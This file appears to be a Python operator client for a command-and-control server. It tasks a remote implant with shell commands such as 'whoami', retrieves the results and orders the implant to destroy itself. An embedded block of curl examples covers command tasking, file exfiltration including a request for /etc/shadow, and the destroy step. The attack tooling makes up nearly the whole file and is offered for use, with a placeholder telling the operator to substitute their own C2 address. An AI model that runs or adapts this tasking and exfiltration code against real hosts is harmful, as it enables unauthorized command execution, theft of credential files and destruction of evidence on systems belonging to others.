import requests
import json
import time

shell_cmds = """
URL='127.0.0.1:8443'
# tasking
curl -k -X POST https://${URL}/task \
    -H "Content-Type: application/json" \
    -d '{"cmd": "ls"}'

# valid file exfil
curl -k -X POST https://${URL}/exfil \
    -H "Content-Type: application/json" \
    -d '{"files": "testfile.txt"}'

# file not found
curl -k -X POST https://${URL}/exfil \
    -H "Content-Type: application/json" \
    -d '{"files": "notafile.txt"}'

# missing read perms
curl -k -X POST https://${URL}/exfil \
    -H "Content-Type: application/json" \
    -d '{"files": "/etc/shadow"}'

# destroy
curl -k -X POST https://${URL}/destroy
"""

base_url = "https://192.168.0.223:8443/"  # Replace with your C2 URL

url = base_url + "task"
headers = {"Content-Type": "application/json"}
data = {"cmd": "whoami"}

response = requests.post(url, headers=headers, data=json.dumps(data), verify=False)

print(response.status_code)
print(response.text)

if response.status_code == 200:
    # View results
    time.sleep(3)  # Wait for the implant to process the task

    view_url = base_url + "view"
    view_response = requests.get(view_url, verify=False)
    print("View Response Status Code:", view_response.status_code)
    print("View Response Text:", view_response.text)

    time.sleep(3)  # Wait for the implant to process the task

    # Destroy the implant
    destroy_url = base_url + "destroy"
    destroy_response = requests.post(destroy_url, verify=False)
    print("Destroy Response Status Code:", destroy_response.status_code)
    print("Destroy Response Text:", destroy_response.text)
else:
    print("Failed to execute task. Status Code:", response.status_code)
